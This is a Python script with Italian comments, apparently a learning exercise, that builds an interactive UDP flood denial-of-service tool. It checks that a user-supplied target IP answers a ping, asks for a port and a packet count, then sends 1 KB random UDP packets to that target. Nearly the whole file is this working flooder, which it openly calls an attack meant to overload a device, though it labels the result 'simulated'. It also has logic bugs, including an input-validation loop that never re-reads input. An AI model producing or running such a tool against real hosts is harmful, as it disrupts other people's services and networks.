# Importiamo la libreria per creare socket UDP e inviare pacchetti
import socket
# Importiamo la libreria per generare i byte casuali da inviare al target
import random
# Importiamo la libreria per gestione semplice delle interruzioni
import sys
# Importiamo la libreria per verificare la validità di un indirizzo IP
import ipaddress
# Importiamo la libreria per pingare la macchina target
from ping3 import ping

# Scriviamo la funzione per validare l'IP preso in input

def check_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Scriviamo la funzione per validare la porta inserita dall'utente
def check_port(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False
    
# Scriviamo la funzione per controllare il numero di pacchetti da inviare
def check_pac(n):
    try:
        n = int(n)
        return n > 0
    except ValueError:
        return False


# Presentiamo il programma
print("Ciao, benvenuto!")
print("Tramite questo software potrai inviare richieste UDP ad un dispositivo al fine di sovraccaricarlo")


# Chiediamo all'utente se desidera proseguire
risposta = input("Vuoi proseguire?: ").lower().strip()

# Se si, chiediamo l'ip del target
if risposta in ["si", "sì", "y"]:
    print("Ottimo, mi serve dunque l'indirizzo IP del povero malcapitato")
    target_ip = input("Inseriscilo di seguito: ").strip()
    
    # Controlliamo l'ip inserito, se ok pinghiamo il target
    if check_ip(target_ip):
        if ping(target_ip, timeout=2) is None:
            print("Il dispositivo target non è raggiungibile, si prega di riprovare")
            exit()
        
        #Se il ping va a buon fine chiediamo di inserire la porta target
        else:
            print("Perfetto! Il dispositivo è raggiungibile, proseguiamo ora con l'attacco DoS")
            
            # Chiediamo all'utente di iserire la porta e validiamone l'input
            while True:
                port = input("Inserisci di seguito la porta che si vuole sovraccaricare di richieste: ").strip()
                
                # Se il controllo va a buon fine creiamo una copia della variabile sotto forma di numero intero
                if check_port(port):
                    target_port = int(port)
                    print("Perfetto, proseguiamo!")
                    break
                else:
                    print("Porta non valida. Inserisci un numero compreso tra 1 e 65535.")
            
            # Iniziamo dunque chiedendo all'utente il numero di pacchetti da inviare
            print("Questo programma è sviluppato per mandare pacchetti di dimensione 1KB")
            pac = input("Inserisci di seguito il numero di pacchetti da mandare: ").strip()

            # Controlliamo se il numero di pacchetti è valido (>0)
            while True:
                if check_pac(pac):
                    intpac = int(pac)
                    print(f"Perfetto, invieremo {intpac} pacchetti da 1KB a {target_ip}:{target_port}")
                    break
                else:
                    print("Input non valido. Inserisci un numero intero positivo.")

            # Creiamo un blocco try per gestire possibili errori
            try:
                # Creiamo il socket UDP
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                # Generiamo un pacchetto casuale da 1024 byte
                pacchetto = random._urandom(1024)

                print("\n🔥 Inizio invio pacchetti...\n")

                # Creiamo il ciclo per inviare i pacchetti
                for i in range(1, intpac + 1):
                    sock.sendto(pacchetto, (target_ip, target_port))
                    print(f"[{i}] Pacchetto inviato a {target_ip}:{target_port}")

                    print("\n Attacco DoS simulato completato con successo.")

            except KeyboardInterrupt:
                print("\n Interrotto dall'utente.")

            except Exception as e:
                print(f"\n Errore durante l'invio dei pacchetti: {e}")

            finally:
                sock.close()

# Se l'utente non vuole proseguire lo salutiamo
elif risposta in ["no", "n"]:
    print("D'accordo, sarà per la prossima volta!")
    print("Arrivederci!")
    exit()

# Se l'utente inserisce valori non previsti lo avvisiamo
else:
    print("Mi spiace ma l'input inserito non rientra tra le possibilità.")
    print("Si prega di rispondere soltanto con 'si' oppure 'no'")
